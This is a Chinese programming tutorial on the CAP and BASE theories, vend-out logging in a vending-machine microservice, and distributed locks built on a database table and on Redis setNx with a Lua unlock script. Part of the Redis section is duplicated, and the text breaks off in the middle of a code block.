pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0">1.分布式相关理论(重点)</h2>
<h3 data-id="heading-1">1.1 CAP定理<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cfd7d997b8f4b9ba2281d931a5eafd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=AOupmtP2Us8lA%2BlAYx1Z2SX2ei0%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h3>
<p>CAP定理，也称为布鲁尔定理，是分布式计算领域的一个基本原理，用于描述在分布式系统设计中的三个基本要素：一致性（Consistency）、可用性（Availability）和分区容错性（Partition Tolerance）之间的权衡关系。</p>
<p>CAP定理表明，在一个分布式计算系统中，不可能同时满足一致性、可用性和分区容错性这三个要求，最多只能同时满足其中的两个。具体而言：</p>
<ol>
<li>一致性（Consistency）指的是在分布式系统中的所有节点，在同一时间点上是否具有相同的数据副本。如果系统在更新数据后，所有节点立即能够看到最新的数据，那么系统就是强一致性的；如果系统在更新数据后，不同节点的数据同步存在一定的延迟，那么系统就是弱一致性的。</li>
<li>可用性（Availability）指的是系统能够在有限的时间内对外提供服务，即系统能够处理请求并返回合理的响应。可用性要求系统在面对故障或异常情况时，仍能够保持正常的运行状态，对外提供服务。</li>
<li>分区容错性（Partition Tolerance）指的是系统能够在面对网络分区（节点之间的通信故障）时，仍能够继续运行，并保持数据一致性和可用性。分布式系统中的网络分区是不可避免的，因此分区容错性是必须考虑的因素。</li>
</ol>
<p>根据CAP定理，分布式系统设计者需要在一致性、可用性和分区容错性之间进行权衡取舍。根据实际需求和应用场景的不同，可以选择满足不同程度的一致性和可用性。</p>
<p>需要注意的是，CAP定理是一个理论上的原则，并没有要求系统只能满足其中的两个要求，实际系统可以根据具体需求和技术手段做出更细致的权衡和设计。此外，CAP定理只描述了三个基本要素之间的关系，并没有涉及性能、性价比等其他方面的考虑。在实际系统设计中，还需要结合具体的业务需求和技术实现来进行综合权衡和设计。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dc07eded0594004b4a98ee04af5e415~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=WirfF8OMb%2BemuUTCTBlYlX1dlwc%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<ul>
<li>CP 架构的系统:</li>
</ul>
<p>（1）<strong>Apache ZooKeeper</strong>：ZooKeeper是一个开源的分布式协调服务，提供了高可用、一致性和持久性的特性，用于构建分布式系统。</p>
<p>（2）<strong>Consul</strong>是由HashiCorp开发的服务发现和配置工具，提供了服务发现、健康检查、KV存储和多数据中心的功能。</p>
<ul>
<li>AP架构的系统：</li>
</ul>
<p>（1）<strong>Redis</strong>：Redis是一个开源的内存数据库，它提供了高性能的键值存储和支持复制、分区容错等特性，强调了可用性和分区容错性。</p>
<p>（2）<strong>Elasticsearch</strong>：Elasticsearch是一个分布式的搜索和分析引擎，具有高可用性和分区容错性，适用于构建实时搜索和分析系统。</p>
<p>（3）<strong>Apache Kafka</strong>：Kafka是一个分布式流处理平台，具有高可用性和分区容错性，被广泛用于构建实时数据管道和事件流处理系统。</p>
<p>（4）<strong>Nacos</strong>： nacos 是一个开源的动态服务发现、配置管理和服务管理平台。它提供了服务注册与发现、动态配置管理、服务健康检查和动态DNS等功能。默认AP，可手动改为CP 。</p>
<h3 data-id="heading-2">2.2 BASE理论</h3>
<p>BASE理论是分布式系统设计中的一个原则，用于描述在大规模分布式系统中追求可用性和性能的策略。BASE是"Basically Available, Soft state, Eventually consistent"的缩写。</p>
<ul>
<li><strong>Basically Available</strong>（基本可用）：系统在面对部分故障或异常情况时，仍能够保持基本的可用性，即系统能够处理请求并返回合理的响应。基本可用性是相对于完全不可用而言的，系统可以通过<strong>降级、限流</strong>等机制来保持基本的可用性。</li>
<li><strong>Soft state</strong>（软状态）：系统中的数据状态可以在一段时间内是不完全一致的。在分布式系统中，由于存在网络延迟、节点故障等因素，各节点之间的数据同步可能存在一定的延迟。软状态的特点是数据状态可以在一段时间内是部分一致的，但最终会达到一致状态。</li>
<li><strong>Eventually consistent</strong>（最终一致性）：系统中的数据最终会达到一致状态，但在某个时间点上可能存在部分不一致的情况。最终一致性是相对于强一致性而言的，系统可以通过<strong>异步复制、延迟补偿</strong>等机制来实现数据的最终一致性。</li>
</ul>
<p>BASE理论的目标是通过放宽一致性要求，追求更高的可用性和性能。相对于传统的ACID（原子性、一致性、隔离性、持久性）事务模型，BASE理论更适用于大规模分布式系统，可以提供更好的可扩展性和容错性。</p>
<p>需要注意的是，BASE理论并不是一个具体的算法或实现，而是一种思想和原则，可以根据具体的业务需求和技术实现进行灵活的应用。在实际系统设计中，需要综合考虑一致性、可用性、性能等因素，选择适合的策略并进行合理的权衡。</p>
<h2 data-id="heading-3">2. 服务端设备运行日志</h2>
<h3 data-id="heading-4">2.1 需求分析</h3>
<p>当用户支付成功后，服务端需要向设备发送出货指令。设备收到出货指令后，执行出货，并将结果发送给服务端。</p>
<p>我们需要随时掌握有哪些数据是成功了，有哪些是失败了，有哪些是没有得到结果。</p>
<h3 data-id="heading-5">2.2 实现思路</h3>
<p>我们需要在服务端建立一个设备发送日志，当发送给设备指令时新增记录，状态为0 ，当收到结果时修改状态，成功为1 ，失败为2 。</p>
<p>这个表就是 tb_vendout_running</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37740863caa84e0aa5ef6cfa1912a5b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=VhonmMZSaAPNrwgbcNLoY9hafo4%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-6">2.3 代码实现</h3>
<h4 data-id="heading-7">2.3.1 发货添加日志</h4>
<p>（1）创建DTO</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VendoutRunningDTO</span> {


    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> orderNo;<span class="hljs-comment">//订单编号</span>


    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> innerCode;<span class="hljs-comment">//售货机编号</span>


    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> channelCode;<span class="hljs-comment">//货道编号</span>


    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> status;<span class="hljs-comment">//状态</span>

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）feign接口类 VMService 新增方法定义</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 新增售货机日志
 * @param vendoutRunning
 * @return 是否成功
 */</span>
<span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/vendoutRunning"</span>)
public boolean <span class="hljs-built_in">addVendoutRunning</span>(<span class="hljs-variable">@RequestBody</span> VendoutRunningDTO vendoutRunning);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）VmServiceFallbackFactory 编写熔断方法</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">addVendoutRunning</span>(<span class="hljs-params">VendoutRunningDTO vendoutRunning</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）创建运行日志状态</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">/**
 * 运行日志状态　
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VMRuningStatus</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> VENDOUT_PREP = <span class="hljs-string">"0"</span>; <span class="hljs-comment">//准备发货　</span>

    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> VENDOUT_COMP = <span class="hljs-string">"1"</span>;<span class="hljs-comment">//完成发货</span>

    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> VENDOUT_FAIL = <span class="hljs-string">"2"</span>;<span class="hljs-comment">//发货失败</span>

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（5）在发送出货指令时，向售货机运行日志插入记录，状态为0 （无结果）</p>
<p>修改CallBackServiceImpl的successPay方法，在发送消息前 ， 添加添加售货机运行日志</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Override</span>
public void successPay(String orderSn) {
    log<span class="hljs-selector-class">.info</span>("支付成功回调{}",orderSn);
    OrderEntity orderEntity = orderService<span class="hljs-selector-class">.getByOrderNo</span>(orderSn);
    <span class="hljs-built_in">if</span>(orderEntity!=null){
        <span class="hljs-built_in">if</span>(orderEntity.getStatus()<span class="hljs-selector-class">.equals</span>( OrderStatus.ORDER_STATUS_CREATE )){
            orderEntity<span class="hljs-selector-class">.setStatus</span>(OrderStatus.ORDER_STATUS_PAYED); <span class="hljs-comment">//订单状态  已支付</span>
            orderEntity<span class="hljs-selector-class">.setPayStatus</span>(PayStatus.PAY_STATUS_PAYED) ;<span class="hljs-comment">//支付状态  成功</span>
            <span class="hljs-comment">//查询出货货道</span>
            ChannelVO channelVO = vmService<span class="hljs-selector-class">.getChannel</span>(orderEntity.getInnerCode(), orderEntity<span class="hljs-selector-class">.getSkuId</span>());
            orderEntity<span class="hljs-selector-class">.setChannelCode</span>( channelVO.getChannelCode() );
            orderService<span class="hljs-selector-class">.updateById</span>( orderEntity );

            <span class="hljs-comment">//添加服务端运行日志</span>
            VendoutRunningDTO vendoutRunning =new  <span class="hljs-built_in">VendoutRunningDTO</span>();
            BeanUtils<span class="hljs-selector-class">.copyProperties</span>( orderEntity,vendoutRunning );
            vendoutRunning<span class="hljs-selector-class">.setStatus</span>(VMRuningStatus.VENDOUT_PREP);  <span class="hljs-comment">//状态:准备发货</span>
            vmService<span class="hljs-selector-class">.addVendoutRunning</span>(vendoutRunning );

            <span class="hljs-comment">//构建报文并发送</span>
            VendoutDTO vendoutDTO=new <span class="hljs-built_in">VendoutDTO</span>();  <span class="hljs-comment">//报文封装对象  （数据传输对象）</span>
            BeanUtils<span class="hljs-selector-class">.copyProperties</span>( orderEntity,vendoutDTO );
            elegentAC<span class="hljs-selector-class">.publish</span>(TopicConfig.getVendoutTopic( orderEntity.getInnerCode() ) , vendoutDTO);
        }
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-8">2.3.2 处理出货结果</h4>
<p>在售货机微服务接到正常的出货结果时，更改日志状态为1 （正常）</p>
<p>在售货机微服务接到异常的出货结果时，更改日志状态为2 （异常）</p>
<p>修改售货机微服务 dkd_vms_service的VendOutResultHandler方法</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 售货机微服务处理出货结果
 */</span>
<span class="hljs-variable">@Topic</span>(TopicConfig.VMS_RESULT_TOPIC)
<span class="hljs-variable">@Slf4j</span>
public class VendoutResultHandler  implements ACHandler&lt;VendoutResultDTO&gt; {


    <span class="hljs-variable">@Autowired</span>
    private ChannelService channelService;

    <span class="hljs-variable">@Autowired</span>
    private VendoutRunningService vendoutRunningService;

    <span class="hljs-variable">@Override</span>
    public void <span class="hljs-built_in">process</span>(String s, VendoutResultDTO vendoutResultDTO) throws Exception {

        <span class="hljs-comment">//出货成功扣减库存</span>
        <span class="hljs-selector-tag">if</span>(vendoutResultDTO.<span class="hljs-built_in">isSuccess</span>()){
            <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>( <span class="hljs-string">"出货成功，扣减库存:{}"</span>,  vendoutResultDTO );
            <span class="hljs-selector-tag">ChannelEntity</span> <span class="hljs-selector-tag">channelEntity</span> = <span class="hljs-selector-tag">channelService</span><span class="hljs-selector-class">.getChannelInfo</span>(vendoutResultDTO.<span class="hljs-built_in">getInnerCode</span>(), vendoutResultDTO.<span class="hljs-built_in">getChannelCode</span>());
            <span class="hljs-selector-tag">channelEntity</span><span class="hljs-selector-class">.setCurrentCapacity</span>( channelEntity.<span class="hljs-built_in">getCurrentCapacity</span>()-<span class="hljs-number">1</span> );
            <span class="hljs-selector-tag">channelService</span><span class="hljs-selector-class">.updateById</span>( channelEntity);
            <span class="hljs-selector-tag">vendoutRunningService</span><span class="hljs-selector-class">.updateStatus</span>(vendoutResultDTO.<span class="hljs-built_in">getOrderNo</span>(), VMRuningStatus.VENDOUT_COMP);<span class="hljs-comment">//发货成功</span>

        }<span class="hljs-selector-tag">else</span>{
            <span class="hljs-selector-tag">vendoutRunningService</span><span class="hljs-selector-class">.updateStatus</span>(vendoutResultDTO.<span class="hljs-built_in">getOrderNo</span>(), VMRuningStatus.VENDOUT_FAIL);<span class="hljs-comment">//发货失败</span>
        }
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-9">2.3.3 最终一致性补偿数据</h4>
<p>因为服务端和设备需要通过网络进行通信，这期间可能会因为网络原因无法将出货指令送达到设备，也有可能会在设备出货后因为网络故障无法将结果上报给服务端。这两种情况，都可能导致运行日志的状态为0 。</p>
<p>那么，遇到这种情况如何处理呢？我们采用的方案是最终一致性。</p>
<p>服务端和设备端都保存有日志记录，设备端在接收到指令后，也会记录在日志中。设备在上报前和上报后都会做记录，如果设备端的日志记录上报状态为未上报，则是因为网络原因导致无法及时上报消息。</p>
<p>对于这些没有成功上报的消息，设备端会每间隔一段时间再次进行状态的上报。这样一旦网络通畅了，就会实现数据的最终一致性。</p>
<h2 data-id="heading-10">3.分布式锁技术研究(重点)</h2>
<h3 data-id="heading-11">3.1 什么是分布式锁</h3>
<p>分布式锁是一种用于协调分布式系统中并发访问的机制。在分布式系统中，多个节点可能同时访问共享资源，为了避免数据不一致或竞争条件的发生，需要一种机制来确保在某个节点操作共享资源时，其他节点不能同时访问该资源。</p>
<p>分布式锁通过在分布式系统中引入一个全局的锁来实现这一目的。当一个节点需要访问共享资源时，它首先尝试获取分布式锁，如果成功获取到锁，则可以执行相应的操作；如果获取锁失败，则需要等待锁释放后再次尝试。</p>
<p>分布式锁可以使用各种技术和算法来实现，常见的实现方式包括基于数据库、基于缓存、基于ZooKeeper等。这些实现方式通常要考虑高可用性、性能和可靠性等因素。</p>
<p>使用分布式锁可以有效地控制分布式系统中的并发访问，确保数据的一致性和正确性。然而，分布式锁的设计和使用需要仔细考虑各种情况，避免死锁、性能瓶颈和单点故障等问题的发生。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef87d16f140447e68ecab793ff4e4a70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=%2FjfeWIr9J4%2FC7fCWCzgrs2H4uQM%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-12">3.2 分布式锁的分类</h3>
<ol>
<li><strong>按实现方式分类</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li>基于数据库的分布式锁：使用数据库的事务和唯一约束来实现分布式锁，通常使用表中的一行记录表示一个锁。</li>
<li>基于缓存的分布式锁：利用分布式缓存（如Redis）的原子性操作和过期时间特性来实现分布式锁。</li>
<li>基于Zookeeper的分布式锁：利用ZooKeeper这样的分布式协调服务来实现分布式锁，通过创建和删除节点来实现锁的获取和释放。</li>
<li>基于Consul 的分布式锁</li>
</ul>
</li>
</ul>
<ol>
<li><strong>按特性分类</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li><strong>阻塞锁</strong>：获取锁失败时，请求线程会被阻塞直到获取到锁为止。</li>
<li><strong>非阻塞锁</strong>：获取锁失败时，请求线程会立即返回而不会被阻塞，可以通过轮询或者回调方式来获取锁。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>按是否可重入分类</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li><strong>可重入锁</strong>：允许同一个线程多次获取同一把锁，通常用于递归调用或者嵌套调用的场景。<br/>
可重入锁是一种特殊的锁，允许同一个线程在持有锁的情况下多次获取该锁，而不会被自己所持有的锁所阻塞。这种特性使得线程可以在递归调用或者嵌套调用的情况下安全地使用锁，而不必担心死锁或者竞争条件的问题。<br/>
在实现可重入锁时，通常需要记录当前锁的持有者以及持有次数。当线程再次获取同一把锁时，系统会检查当前线程是否已经持有该锁，如果是，则增加持有次数；如果不是，则阻塞或者返回失败。</li>
<li><strong>不可重入锁</strong></li>
</ul>
</li>
</ul>
<ol>
<li>按是否公平分类：</li>
</ol>
<ul>
<li>
<ul>
<li>
<p><strong>公平锁</strong>：<br/>
公平锁是一种锁，它保证锁的获取按照请求的顺序进行分配，避免某些线程长期等待而无法获取锁的情况，从而避免了"饥饿"现象的发生。<br/>
在公平锁中，当有多个线程竞争同一把锁时，锁会按照请求的顺序分配给等待时间最长的线程，而不是随机分配给任意一个等待的线程。这样可以确保所有线程都有公平的机会获取锁，避免了某些线程长期无法获取锁的情况。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fd41aa4e0464835b93fa5f54be31190~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=Bx%2BV%2BGGtlJI5hE%2BGsfihrFb2zro%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
</li>
<li>
<p><strong>非公平锁</strong> 当有多个线程竞争同一把锁时 ，随机分配给任意一个等待的线程。</p>
</li>
<li>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b96573af220444ec8ecc4d4939902b7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=eWMIikYuld5wRU2ea%2FMfil2iiek%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-13">3.3 实现分布式锁的几种方式</h3>
<h4 data-id="heading-14">3.3.1 基于数据库实现的分布式锁（了解）</h4>
<p><strong>创建锁表</strong>：在数据库中创建一张用于存储锁信息的表，例如名为<code>distributed_lock</code>，包括以下字段：</p>
<ul>
<li><code>lock_name</code>：锁的名称，用于区分不同的锁。</li>
<li><code>holder</code>：锁的持有者标识，可以是进程ID、线程ID或者唯一的标识符。</li>
<li><code>expire_time</code>：锁的过期时间，避免锁被长时间占用。</li>
</ul>

<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> distributed_lock (
    lock_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">PRIMARY</span> KEY,
    holder <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>),
    expire_time <span class="hljs-type">TIMESTAMP</span>
);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>获取锁</strong>：在需要获取锁的地方，通过数据库事务来尝试插入一条锁记录，如果插入成功则表示获取到了锁，否则表示锁已经被其他进程持有。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> distributed_lock (lock_name, holder, expire_time) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'my_lock'</span>, <span class="hljs-string">'process_id'</span>, NOW() <span class="hljs-operator">+</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">10</span> <span class="hljs-keyword">SECOND</span>);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>释放锁</strong>：在任务执行完成或者锁过期时，通过事务操作来删除对应的锁记录，释放锁资源。</p>
<pre><code class="hljs language-ini" lang="ini">DELETE FROM distributed_lock WHERE <span class="hljs-attr">lock_name</span> = <span class="hljs-string">'my_lock'</span> AND holder = <span class="hljs-string">'process_id'</span><span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>处理锁超时</strong>：定期清理过期的锁记录，可以通过定时任务或者后台进程来实现。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> distributed_lock <span class="hljs-keyword">WHERE</span> expire_time <span class="hljs-operator">&lt;</span> NOW();
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>优缺点：</p>
<p>优点：不需要引入其它中间件。</p>
<p>缺点：对数据库压力较大，执行效率较低。</p>
<h4 data-id="heading-15">3.3.2 Redis分布式锁-setNx命令(了解)</h4>
<p>redis实现分布式锁可以使用Redis的setNx命令来实现，它的原理是这样的：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6cfa1d717614f3c9c26aa17f6ddeb2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=SjMQRpqZFutkj%2FJtSR0kUd10MSw%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>如果你使用的是SpringDataRedis ,实现的方式也比较简单：</p>
<p>如果是加锁，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">Boolean <span class="hljs-attr">result</span> = redisTemplate.opsForValue().setIfAbsent(key, <span class="hljs-number">1</span>, <span class="hljs-number">60</span>, TimeUnit.SECONDS)<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这里面实际就是调用了redis的setnx ，<strong>setnx</strong> 大致原理，主要依托了它的<strong>key不存在才能set成功的特性</strong>。</p>
<p>如果是释放锁，比较简单的是直接把这个key删除掉。但是这样一来删除锁和加锁的不一定是同一个进程，所以我们需要释放锁的时候判断当前进程和加锁的进程是不是同一个进程，这就需要在删除前再查询一次，而这样一来就不是一个原子操作了。如果释放锁想要成为一个原子操作，比较常见的方案就是通过调用lua脚本来实现。</p>
<p>释放锁的lua脚本是这样写的：</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'get'</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>] 
 <span class="hljs-keyword">then</span> 
 <span class="hljs-comment">-- 执行删除操作</span>
 <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">'del'</span>, KEYS[<span class="hljs-number">1</span>]) 
<span class="hljs-keyword">else</span> 
 <span class="hljs-comment">-- 不成功，返回0</span>
 <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> 
 <span class="hljs-keyword">end</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>在这个Lua脚本中，假设锁的键名为<code>KEYS[1]</code>，并且锁的值为<code>ARGV[1]</code>。脚本首先通过<code>get</code>命令获取锁的当前值，然后判断锁的当前值是否与传入的值相同。如果相同，则使用<code>del</code>命令删除该键，表示成功释放锁；如果不相同，则返回0，表示释放失败。</p>
<p>执行释放锁的lua脚本</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 解锁脚本</span>
<span class="hljs-title class_">DefaultRedisScript</span>&lt;<span class="hljs-title class_">Object</span>&gt; unlockScript = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>();
unlockScript.<span class="hljs-title function_">setScriptSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceScriptSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">"lockDel.lua"</span>)));
 <span class="hljs-comment">// 执行lua脚本解锁</span>
 redisTemplate.<span class="hljs-title function_">execute</span>(unlockScript, <span class="hljs-title class_">Collections</span>.<span class="hljs-title function_">singletonList</span>(keyName), value);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>【知识点小节】</p>
<ol>
<li>如何实现redis分布式锁？</li>
</ol>
<p>（1）我们可以使用Redis的setNx命令加锁，对于我们常用的SpringDataRedis框架来说，可以使用setIfAbsent方法来实现加锁。</p>
<p>（2）这种方式的释放锁不具备原子性，所以我们需要将释放锁的操作放到lua脚本，在代码中调用lua脚本来实现。我们可以使用redisTemplate的execute方法来调用lua脚本。</p>
<h4 data-id="heading-16">redis实现分布式锁可以使用Redis的setNx命令来实现，它的原理是这样的：</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a9f53e510844a2fa8ad2d6ce1b371b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=V3dOW%2BfWwtbA8uNRrD1tVJcM3oQ%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>如果你使用的是SpringDataRedis ,实现的方式也比较简单：</p>
<p>如果是加锁，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">Boolean <span class="hljs-attr">result</span> = redisTemplate.opsForValue().setIfAbsent(key, <span class="hljs-number">1</span>, <span class="hljs-number">60</span>, TimeUnit.SECONDS)<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这里面实际就是调用了redis的setnx ，<strong>setnx</strong> 大致原理，主要依托了它的<strong>key不存在才能set成功的特性</strong>。</p>
<p>如果是释放锁，比较简单的是直接把这个key删除掉。但是这样一来删除锁和加锁的不一定是同一个进程，所以我们需要释放锁的时候判断当前进程和加锁的进程是不是同一个进程，这就需要在删除前再查询一次，而这样一来就不是一个原子操作了。如果释放锁想要成为一个原子操作，比较常见的方案就是通过调用lua脚本来实现。</p>
<p>释放锁的lua脚本是这样写的：</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'get'</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>] 
 <span class="hljs-keyword">then</span> 
 <span class="hljs-comment">-- 执行删除操作</span>
 <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">'del'</span>, KEYS[<span class="hljs-number">1</span>]) 
<span class="hljs-keyword">else</span> 
 <span class="hljs-comment">-- 不成功，返回0</span>
 <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> 
 <span class="hljs-keyword">end</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>在这个Lua脚本中，假设锁的键名为KEYS[1]，并且锁的值为ARGV[1]。脚本首先通过get命令获取锁的当前值，然后判断锁的当前值是否与传入的值相同。如果相同，则使用del命令删除该键，表示成功释放锁；如果不相同，则返回0，表示释放失败。</p>
<p>执行释放锁的lua脚本</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 解锁脚本</span>
<span class="hljs-title class_">DefaultRedisScript</span>&lt;<span class="hljs-title class_">Object</span>&gt; unlockScript = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>();
